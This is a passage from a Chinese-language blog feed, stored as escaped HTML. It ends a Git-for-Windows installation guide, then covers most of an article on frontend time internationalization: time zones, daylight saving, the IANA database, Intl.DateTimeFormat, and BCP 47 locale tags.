href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\r\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 <code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\r\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\r\n    return new Date(date.toLocaleString('en-US', { timeZone }))\r\n}\r\n\r\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\r\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\r\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\r\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\r\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\r\n        year: 'numeric',\r\n        month: '2-digit',\r\n        day: '2-digit',\r\n        hour: '2-digit',\r\n        minute: '2-digit',\r\n        second: '2-digit',\r\n        hour12: false,\r\n        timeZone\r\n    })\r\n    return {\r\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\r\n        convert (date) {\r\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\r\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\r\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\r\n        }\r\n    }\r\n}\r\n\r\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\r\n\r\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\r\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\r\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\r\n    return converter.convert(new Date(secDate), tzName) - secDate\r\n}\r\n\r\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\r\ncmn-Hans-SG = 中文普通话-简体-新加坡\r\ncmn-Hant-TW = 中文普通话-繁体-台湾\r\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\r\ncmn = 中文普通话\r\n\r\nzh-Hans = 中文-简体\r\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\r\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\r\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\r\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\r\n}\r\n\r\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\r\n    year: 'numeric',\r\n    month: 'short',\r\n    day: 'numeric',\r\n    weekday: 'long'\r\n}\r\nconst now = new Date()\r\n\r\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\r\n\r\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\r\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\r\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\r\n\r\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\r\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\r\n\r\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\r\n\r\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\r\n\r\nzhCNFormatter.format(now) // 2021年10月13日星期三\r\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\r\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\r\n\r\njaFormatter.format(now) // 2021年10月13日水曜日\r\njaAltFormatter.format(now) // 令和3年10月13日水曜日\r\n\r\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 